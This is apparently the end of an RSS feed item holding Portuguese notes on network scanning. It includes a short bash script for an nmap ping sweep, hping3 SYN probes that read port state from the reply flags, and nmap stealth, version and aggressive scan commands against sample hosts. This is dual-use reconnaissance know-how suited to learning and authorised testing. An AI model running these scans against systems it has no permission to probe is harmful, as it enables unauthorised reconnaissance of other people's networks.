+#!/bin/bash echo &#34;Insira o Range:&#34; read RANGE nmap -sP $RANGE | grep for | cut -d &#34; &#34; -f5 echo &#34;Isso aê&#34; Para tornar executável o script faça:
+# chmod +x maroto_scan.sh &gt;&gt;Resumo Porta aberta = SYN + ACK Porta Fechada = RST # hping3 --syn -c 1 -p 80 sitedeteste.com SYN ACK = Flag:SA # hping3 --syn -c 1 -p 8000 192.168.0.11 RST = Flag:RA ( reset ack ) # nmap -sS -p 80 192.168.0.113 (sem ruidos) # nmap -sV -p 80 192.168.0.113 (versoes dos serviços, porém bem barulhento) # nmap -A 192.168.0.113 (full scan, ele vai utilizaar recursos do NMAP para filtrar o maxímo que conseguir) ]]></content:encoded>
+    </item>
+  </channel>
+</rss>
